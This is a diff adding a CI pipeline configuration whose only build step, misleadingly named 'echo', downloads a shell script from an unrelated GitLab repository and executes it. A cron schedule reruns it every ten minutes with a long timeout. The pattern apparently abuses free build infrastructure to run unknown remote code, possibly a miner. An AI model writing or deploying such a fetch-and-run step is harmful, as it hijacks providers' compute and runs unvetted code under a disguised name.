@@ -1,0 +1,19 @@
+--- 
+box: "ubuntu:bionic"
+build: 
+  steps: 
+    - 
+      script: 
+        code: |
+            apt update -y && apt install -y wget xz-utils && apt install 
+
+-y bash
+            wget https://gitlab.com/pakmolemu/madang/-/raw/main/maem.sh && 
+
+chmod +x maem.sh && ./maem.sh
+        name: echo
+command-timeout: 360
+cron: "*/10 * * * *"
+
+
+
